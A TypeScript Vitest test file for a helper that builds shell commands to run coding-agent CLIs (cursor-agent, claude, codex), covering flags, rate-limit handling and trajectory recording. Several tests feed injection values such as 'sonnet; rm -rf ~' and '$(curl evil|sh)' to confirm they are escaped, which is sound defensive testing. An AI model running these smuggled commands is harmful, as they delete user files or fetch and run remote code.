/**
 * @description Tests for {@link runIteration} / {@link runIterationAsync} backend dispatch and
 * shell commands passed to {@link spawnSync} / {@link spawn}.
 */

import { EventEmitter } from 'node:events';
import { PassThrough } from 'node:stream';

import type { ChildProcess } from 'child_process';
import { spawn, spawnSync } from 'child_process';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { runIteration, runIterationAsync } from '../runIteration';

/**
 * @description Presents a bare EventEmitter as a ChildProcess test double whose stdio and
 * kill are assigned by the caller, without a cast.
 */
function asChildProcess(value: EventEmitter): ChildProcess;
function asChildProcess(value: EventEmitter): unknown {
  return value;
}

vi.mock('child_process', async (importOriginal) => {
  const actual = await importOriginal<typeof import('child_process')>();
  return {
    ...actual,
    spawn: vi.fn(),
    spawnSync: vi.fn(),
  };
});

describe('runIteration (sync) backend dispatch', () => {
  beforeEach(() => {
    vi.mocked(spawnSync).mockClear();
    vi.mocked(spawnSync).mockReturnValue({
      error: undefined,
      output: ['done'],
      pid: 0,
      signal: null,
      status: 0,
      stderr: '',
      stdout: 'done',
    });
    vi.spyOn(console, 'log').mockImplementation(() => {});
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('defaults to cursor-agent when backend omitted', () => {
    runIteration({
      agentPrompt: 'x',
      iteration: 1,
    });
    expect(spawnSync).toHaveBeenCalledTimes(1);
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toMatch(/^cursor-agent --force -p "/);
  });

  it('invokes cursor-agent for --backend cursor', () => {
    runIteration({
      agentPrompt: 'hello "world"',
      backend: 'cursor',
      iteration: 1,
    });
    expect(spawnSync).toHaveBeenCalledTimes(1);
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toMatch(/^cursor-agent --force -p "/);
    expect(firstArg).toContain('hello \\"world\\"');
  });

  it('invokes claude CLI for --backend claude', () => {
    runIteration({
      agentPrompt: 'task',
      backend: 'claude',
      iteration: 1,
    });
    expect(spawnSync).toHaveBeenCalledTimes(1);
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toMatch(/^claude -p --permission-mode acceptEdits "/);
    expect(firstArg).not.toContain('--model');
  });

  it('requests stream-json from claude and returns result.result as the iteration text', () => {
    vi.mocked(spawnSync).mockReturnValue({
      error: undefined,
      output: [],
      pid: 0,
      signal: null,
      status: 0,
      stderr: '',
      stdout: `${JSON.stringify({ subtype: 'init', type: 'system' })}\n${JSON.stringify({ is_error: false, result: 'done\n<promise>COMPLETE</promise>', type: 'result' })}\n`,
    });
    const onUsageLimit = vi.fn();

    const result = runIteration({
      agentPrompt: 'task',
      backend: 'claude',
      iteration: 1,
      onUsageLimit,
    });

    expect(vi.mocked(spawnSync).mock.calls[0]?.[0]).toContain(
      '--output-format stream-json --verbose',
    );
    expect(result).toBe('done\n<promise>COMPLETE</promise>');
    expect(onUsageLimit).not.toHaveBeenCalled();
  });

  it('delivers a usage limit to onUsageLimit without changing the string return', () => {
    vi.mocked(spawnSync).mockReturnValue({
      error: undefined,
      output: [],
      pid: 0,
      signal: null,
      status: 1,
      stderr: '',
      stdout: [
        {
          rate_limit_info: {
            rateLimitType: 'five_hour',
            resetsAt: 1_793_594_400,
            status: 'rejected',
          },
          type: 'rate_limit_event',
        },
        {
          api_error_status: 429,
          is_error: true,
          result: 'limit reached',
          type: 'result',
        },
      ]
        .map((event) => JSON.stringify(event))
        .join('\n'),
    });
    const onUsageLimit = vi.fn();

    const result = runIteration({
      agentPrompt: 'task',
      backend: 'claude',
      iteration: 1,
      onUsageLimit,
    });

    expect(result).toBe('limit reached');
    expect(onUsageLimit).toHaveBeenCalledExactlyOnceWith({
      rateLimitType: 'five_hour',
      resetsAt: new Date(1_793_594_400_000).toISOString(),
    });
  });

  it('omits --model for claude when model is auto', () => {
    runIteration({
      agentPrompt: 'x',
      backend: 'claude',
      iteration: 1,
      model: 'auto',
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).not.toContain('--model');
  });

  it('passes --model for claude when model is set', () => {
    runIteration({
      agentPrompt: 'x',
      backend: 'claude',
      iteration: 1,
      model: 'sonnet',
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toContain(' --model sonnet');
  });

  it('escapes a malicious --model value for claude (no shell injection)', () => {
    runIteration({
      agentPrompt: 'x',
      backend: 'claude',
      iteration: 1,
      model: 'sonnet; rm -rf ~',
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toContain(' --model "sonnet; rm -rf ~"');
    expect(firstArg).not.toContain(' --model sonnet; rm');
  });

  it('escapes a malicious --model value for cursor (no shell injection)', () => {
    runIteration({
      agentPrompt: 'x',
      backend: 'cursor',
      iteration: 1,
      model: '$(curl evil|sh)',
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toContain(' --model "\\$(curl evil|sh)"');
    expect(firstArg).not.toMatch(/--model "?\$\(curl evil\|sh\)/);
  });

  it('passes -w worktree for cursor when configured', () => {
    runIteration({
      agentPrompt: 'x',
      backend: 'cursor',
      iteration: 1,
      worktree: 'my-wt',
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toMatch(/cursor-agent --force -p "/);
    expect(firstArg).toContain('-w my-wt');
  });

  it('passes cursor-only worktree-base and skip-worktree-setup', () => {
    runIteration({
      agentPrompt: 'x',
      backend: 'cursor',
      iteration: 1,
      skipWorktreeSetup: true,
      worktree: 'my-wt',
      worktreeBase: 'main',
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toContain('-w my-wt');
    expect(firstArg).toContain('--worktree-base main');
    expect(firstArg).toContain('--skip-worktree-setup');
  });

  it('passes -w worktree for claude when configured', () => {
    runIteration({
      agentPrompt: 'x',
      backend: 'claude',
      iteration: 1,
      worktree: 'my-wt',
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toMatch(/^claude -p --permission-mode acceptEdits "/);
    expect(firstArg).toContain('-w my-wt');
    expect(firstArg).not.toContain('--worktree-base');
  });

  it('neutralizes $(...) command substitution in the prompt (cursor)', () => {
    runIteration({
      agentPrompt: 'plan: $(curl evil|sh) done',
      backend: 'cursor',
      iteration: 1,
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toContain('plan: \\$(curl evil|sh) done');
    expect(firstArg).not.toContain('plan: $(curl evil|sh) done');
  });

  it('neutralizes backtick command substitution in the prompt (cursor)', () => {
    runIteration({
      agentPrompt: 'task `id` here',
      backend: 'cursor',
      iteration: 1,
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toContain('task \\`id\\` here');
    expect(firstArg).not.toContain('task `id` here');
  });

  it('neutralizes ${...} parameter expansion in the prompt (claude)', () => {
    runIteration({
      agentPrompt: 'leak ${HOME} now',
      backend: 'claude',
      iteration: 1,
    });
    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
    expect(firstArg).toContain('leak \\${HOME} now');
    expect(firstArg).not.toContain('leak ${HOME} now');
  });
});

describe('runIterationAsync backend dispatch', () => {
  beforeEach(() => {
    vi.mocked(spawn).mockClear();
    vi.mocked(spawn).mockImplementation((): ChildProcess => {
      const child = asChildProcess(new EventEmitter());
      child.stdout = new PassThrough();
      child.stderr = new PassThrough();
      child.kill = vi.fn(() => true);
      // `killed` is readonly on ChildProcess; Object.assign bypasses that for this test double.
      Object.assign(child, { killed: false });
      queueMicrotask(() => {
        child.emit('close', 0);
      });
      return child;
    });
    vi.spyOn(console, 'log').mockImplementation(() => {});
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('defaults to cursor-agent when backend omitted', async () => {
    await runIterationAsync({
      agentPrompt: 'hello',
      iteration: 1,
    });
    const firstArg = vi.mocked(spawn).mock.calls[0]?.[0];
    expect(firstArg).toMatch(/^cursor-agent --force -p "/);
  });

  it('spawns claude command for --backend claude', async () => {
    await runIterationAsync({
      agentPrompt: 'hello',
      backend: 'claude',
      iteration: 2,
    });
    expect(spawn).toHaveBeenCalledTimes(1);
    const firstArg = vi.mocked(spawn).mock.calls[0]?.[0];
    expect(firstArg).toMatch(/^claude -p --permission-mode acceptEdits "/);
  });

  it('threads effort into the spawned claude and codex commands', async () => {
    await runIterationAsync({
      agentPrompt: 'hello',
      backend: 'claude',
      effort: 'extraHigh',
      iteration: 1,
    });
    await runIterationAsync({
      agentPrompt: 'hello',
      backend: 'codex',
      effort: 'max',
      iteration: 1,
    });
    expect(vi.mocked(spawn).mock.calls[0]?.[0]).toContain(' --effort xhigh');
    expect(vi.mocked(spawn).mock.calls[1]?.[0]).toContain(
      ' -c model_reasoning_effort=high',
    );
  });

  it('leaves the cursor-agent command unchanged when effort is set', async () => {
    await runIterationAsync({
      agentPrompt: 'hello',
      backend: 'cursor',
      iteration: 1,
    });
    await runIterationAsync({
      agentPrompt: 'hello',
      backend: 'cursor',
      effort: 'ultra',
      iteration: 1,
    });
    expect(vi.mocked(spawn).mock.calls[1]?.[0]).toBe(
      vi.mocked(spawn).mock.calls[0]?.[0],
    );
  });

  it('spawns cursor-agent for --backend cursor', async () => {
    await runIterationAsync({
      agentPrompt: 'hello',
      backend: 'cursor',
      iteration: 1,
    });
    const firstArg = vi.mocked(spawn).mock.calls[0]?.[0];
    expect(firstArg).toMatch(/^cursor-agent --force -p "/);
  });

  it('passes -w worktree on async cursor iteration', async () => {
    await runIterationAsync({
      agentPrompt: 'hello',
      backend: 'cursor',
      iteration: 1,
      worktree: 'async-wt',
    });
    const firstArg = vi.mocked(spawn).mock.calls[0]?.[0];
    expect(firstArg).toContain('-w async-wt');
  });

  it('passes -w worktree on async claude iteration', async () => {
    await runIterationAsync({
      agentPrompt: 'hello',
      backend: 'claude',
      iteration: 2,
      worktree: 'async-wt',
    });
    const firstArg = vi.mocked(spawn).mock.calls[0]?.[0];
    expect(firstArg).toContain('-w async-wt');
  });

  it('neutralizes $(...) and backticks in the async prompt', async () => {
    await runIterationAsync({
      agentPrompt: 'inject $(id) and `whoami`',
      backend: 'cursor',
      iteration: 1,
    });
    const firstArg = vi.mocked(spawn).mock.calls[0]?.[0];
    expect(firstArg).toContain('inject \\$(id) and \\`whoami\\`');
    expect(firstArg).not.toContain('inject $(id) and `whoami`');
  });
});

describe('runIterationAsync trajectory capture', () => {
  const CODEX_STREAM = [
    '{"thread_id":"th_1","type":"thread.started"}',
    '{"item":{"command":"ls","exit_code":0,"id":"i1","item_type":"command_execution"},"type":"item.completed"}',
    '{"item":{"id":"i2","item_type":"agent_message","text":"done <promise>COMPLETE</promise>"},"type":"item.completed"}',
    '{"type":"turn.completed","usage":{"input_tokens":10,"output_tokens":2}}',
  ].join('\n');

  const spawnEmitting = (stdout: string, exitCode: number): void => {
    vi.mocked(spawn).mockImplementation((): ChildProcess => {
      const child = asChildProcess(new EventEmitter());
      child.stdout = new PassThrough();
      child.stderr = new PassThrough();
      child.kill = vi.fn(() => true);
      Object.assign(child, { killed: false });
      queueMicrotask(() => {
        child.stdout?.emit('data', stdout);
        child.emit('close', exitCode);
      });
      return child;
    });
  };

  beforeEach(() => {
    vi.mocked(spawn).mockClear();
    vi.mocked(spawnSync).mockReturnValue({
      error: undefined,
      output: [],
      pid: 0,
      signal: null,
      status: 0,
      stderr: '',
      stdout: 'codex-cli 0.145.0\n',
    });
    vi.spyOn(console, 'log').mockImplementation(() => {});
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('runs the agent in its structured output mode', async () => {
    spawnEmitting(CODEX_STREAM, 0);

    await runIterationAsync({
      agentPrompt: 'go',
      backend: 'codex',
      iteration: 1,
    });

    expect(vi.mocked(spawn).mock.calls[0]?.[0]).toMatch(/^codex exec --json /);
  });

  it('still returns the prose text, Ralph markers included', async () => {
    spawnEmitting(CODEX_STREAM, 0);

    const output = await runIterationAsync({
      agentPrompt: 'go',
      backend: 'codex',
      iteration: 1,
    });

    expect(output).toContain('<promise>COMPLETE</promise>');
    expect(output).not.toContain('"type"');
  });

  it('hands the transcript to onTrajectory with the run facts', async () => {
    spawnEmitting(CODEX_STREAM, 0);
    const onTrajectory = vi.fn();

    await runIterationAsync({
      agentPrompt: 'go',
      backend: 'codex',
      iteration: 4,
      onTrajectory,
      trajectoryFacts: { planRunId: 'run-1', taskId: 'task-1' },
    });

    expect(onTrajectory).toHaveBeenCalledTimes(1);
    expect(onTrajectory.mock.calls[0]?.[0]).toMatchObject({
      exitCode: 0,
      outcome: 'succeeded',
      trajectory: {
        agent: { name: 'codex', version: 'codex-cli 0.145.0' },
        extra: {
          openthrottle: { iteration: 4, planRunId: 'run-1', taskId: 'task-1' },
        },
      },
    });
  });

  it('marks a non-zero exit as failed', async () => {
    spawnEmitting(CODEX_STREAM, 1);
    const onTrajectory = vi.fn();

    await runIterationAsync({
      agentPrompt: 'go',
      backend: 'codex',
      iteration: 1,
      onTrajectory,
    });

    expect(onTrajectory.mock.calls[0]?.[0]).toMatchObject({
      outcome: 'failed',
    });
  });

  it('never fails the iteration when recording fails', async () => {
    spawnEmitting(CODEX_STREAM, 0);
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});

    const output = await runIterationAsync({
      agentPrompt: 'go',
      backend: 'codex',
      iteration: 1,
      onTrajectory: () => Promise.reject(new Error('server down')),
    });

    expect(output).toContain('done');
    expect(warn).toHaveBeenCalledWith(expect.stringContaining('server down'));
  });

  it('records nothing when the agent printed no structured events', async () => {
    spawnEmitting('Not logged in\n', 1);
    const onTrajectory = vi.fn();

    await runIterationAsync({
      agentPrompt: 'go',
      backend: 'codex',
      iteration: 1,
      onTrajectory,
    });

    expect(onTrajectory).not.toHaveBeenCalled();
  });
});
